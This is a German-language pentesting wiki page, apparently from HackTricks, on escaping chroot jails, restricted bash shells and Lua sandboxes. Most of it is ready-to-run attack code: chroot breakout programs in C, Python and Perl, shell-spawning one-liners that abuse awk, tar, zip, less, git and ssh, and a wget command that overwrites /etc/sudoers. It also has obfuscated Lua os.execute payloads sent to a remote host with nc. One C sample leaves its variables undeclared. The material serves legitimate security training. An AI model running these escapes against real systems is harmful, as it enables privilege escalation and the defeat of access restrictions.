# Aus Jails entkommen

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Suche in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **ob du irgendein Binary mit der Eigenschaft "Shell" ausführen kannst**

## Chroot Escapes

Von [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Der chroot-Mechanismus ist **nicht dazu gedacht, sich gegen** absichtliche Manipulation durch **privilegierte** (**root**) **Benutzer** zu verteidigen. Auf den meisten Systemen werden chroot-Kontexte nicht korrekt gestapelt, und chrooted Programme **mit ausreichenden Privilegien können ein zweites chroot durchführen, um auszubrechen**.\
Normalerweise bedeutet das, dass du zum Entkommen root innerhalb des chroot sein musst.

> [!TIP]
> Das **Tool** [**chw00t**](https://github.com/earthquake/chw00t) wurde erstellt, um die folgenden Szenarien auszunutzen und aus `chroot` zu entkommen.

### Root + CWD

> [!WARNING]
> Wenn du **root** innerhalb eines chroot bist, **kannst du entkommen**, indem du **ein anderes chroot** erstellst. Das liegt daran, dass 2 chroots (in Linux) nicht koexistieren können. Wenn du also einen Ordner erstellst und dann **ein neues chroot** auf diesem neuen Ordner erstellst, während **du außerhalb davon** bist, wirst du nun **außerhalb des neuen chroot** sein und dich daher im FS befinden.
>
> Das passiert, weil chroot normalerweise dein Arbeitsverzeichnis NICHT in das angegebene verschiebt, sodass du ein chroot erstellen kannst, aber e außerhalb davon.

Normalerweise findest du das `chroot`-Binary nicht innerhalb eines chroot jail, aber du **könntest** ein Binary kompilieren, hochladen und ausführen:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Dies ist ähnlich wie der vorherige Fall, aber in diesem Fall speichert der **attacker einen file descriptor für das aktuelle Verzeichnis** und erstellt dann das **chroot in einem neuen Ordner**. Schließlich, da er **Zugriff** auf diesen **FD** **außerhalb** des chroot hat, greift er darauf zu und **entkommt**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD kann über Unix Domain Sockets übergeben werden, also:
>
> - Erstelle einen child process (fork)
> - Erstelle UDS, damit parent und child miteinander sprechen können
> - Führe chroot im child process in einem anderen Ordner aus
> - Erstelle im parent proc einen FD eines Ordners, der außerhalb des neuen child proc chroot liegt
> - Übergebe diesen FD an den child procc mit Hilfe von UDS
> - Der child process macht chdir zu diesem FD, und weil er außerhalb seines chroot liegt, entkommt er dem jail

### Root + Mount

> [!WARNING]
>
> - Das root device (/) in ein Verzeichnis innerhalb des chroot mounten
> - In dieses Verzeichnis chrooten
>
> Das ist in Linux möglich

### Root + /proc

> [!WARNING]
>
> - Mount procfs in ein Verzeichnis innerhalb des chroot (falls noch nicht vorhanden)
> - Suche nach einer pid, die einen anderen root/cwd-Eintrag hat, wie: /proc/1/root
> - Chroot in diesen Eintrag

### Root(?) + Fork

> [!WARNING]
>
> - Erstelle einen Fork (child proc) und chroot in einen anderen Ordner tiefer im FS und CD dorthin
> - Verschiebe vom parent process aus den Ordner, in dem sich der child process befindet, in einen Ordner vor dem chroot der children
> - Dieser children process wird feststellen, dass er sich außerhalb des chroot befindet

### ptrace

> [!WARNING]
>
> - Früher konnten users ihre eigenen Prozesse von einem Prozess aus debuggen... aber das ist standardmäßig nicht mehr möglich
> - Falls es dennoch möglich ist, könntest du ptrace in einen Prozess ausführen und darin eine shellcode ausführen ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Erhalte Infos über das jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH ändern

Prüfe, ob du die PATH-Umgebungsvariable ändern kannst
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Verwendung von vim
```bash
:set shell=/bin/sh
:shell
```
### Pager und Help-Viewer

In vielen eingeschränkten Umgebungen sind **Pagers** oder **Help-Viewer** noch verfügbar. Diese lassen sich in der Regel schneller missbrauchen, als `PATH` neu aufzubauen.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Wenn `git` verfügbar ist, denke daran, dass dessen Hilfeausgabe normalerweise durch einen Pager läuft:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Häufige GTFOBins-One-Liner

Sobald du weißt, welche Binaries erreichbar sind, teste zuerst die offensichtlichen Shell-Spawner:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Wenn du nur **arguments injizieren** in einen erlaubten command kannst (statt ihn frei auszuführen), prüfe auch **GTFOArgs**.

### Script erstellen

Prüfe, ob du eine ausführbare Datei mit _/bin/bash_ als Inhalt erstellen kannst
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Bash über SSH erhalten

Wenn du per SSH zugreifst, kannst du den Server oft dazu bringen, ein **anderes Programm** statt der eingeschränkten Login-Shell auszuführen:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Wenn `ssh` eines der wenigen lokal erlaubten Binaries ist, denke daran, dass es auch als **GTFOBin** missbraucht werden kann:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Deklarieren
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Du kannst beispielsweise die sudoers-Datei überschreiben
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Manche Umgebungen werfen dich nicht in ein normales `rbash`, sondern in **Wrappers** wie `git-shell`, `rssh` oder `lshell`:

- `git-shell` akzeptiert nur serverseitige Git-Commands plus alles, was sich in `~/git-shell-commands/` befindet. Wenn dieses Verzeichnis existiert, führe `help` aus, um die erlaubten benutzerdefinierten Aktionen aufzulisten. Wenn du dort **schreiben** kannst, wird jedes in dieses Verzeichnis gelegte ausführbare Programm erreichbar.
- `rssh` / `lshell` erlauben häufig nur `scp`, `sftp`, `rsync` oder Git-ähnliche Operationen. In diesen Fällen zuerst auf **file write primitives** fokussieren: Lade `authorized_keys`, eine Shell-Startdatei oder ein Helper-Script in einen beschreibbaren Pfad hoch und verbinde dich dann erneut mit `ssh -t ...`.
- Wenn der Wrapper nur die Command Line filtert, enumeriere die erreichbaren Binaries und pivotiere dann zurück zu **GTFOBins / GTFOArgs**.

### Other tricks

Prüfe außerdem:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Es könnte auch interessant sein, die Seite anzusehen:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks zum Entkommen aus Python-Jails findest du auf der folgenden Seite:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Auf dieser Seite findest du die globalen Funktionen, auf die du in Lua Zugriff hast: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Einige Tricks, um **Funktionen einer Library ohne Punkte aufzurufen**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Funktionen einer Bibliothek aufzählen:
```bash
for k,v in pairs(string) do print(k,v) end
```
Beachte, dass sich jedes Mal, wenn du den vorherigen One-Liner in einer **anderen lua-Umgebung** ausführst, die Reihenfolge der Funktionen ändert. Wenn du also eine bestimmte Funktion ausführen musst, kannst du einen brute force attack durchführen, indem du verschiedene lua-Umgebungen lädst und die erste Funktion der Bibliothek aufrufst:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interaktive lua-Shell erhalten**: Wenn du dich in einer eingeschränkten lua-Shell befindest, kannst du eine neue lua-Shell (und hoffentlich eine unbegrenzte) erhalten, indem du Folgendes aufrufst:
```bash
debug.debug()
```
## Referenzen

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
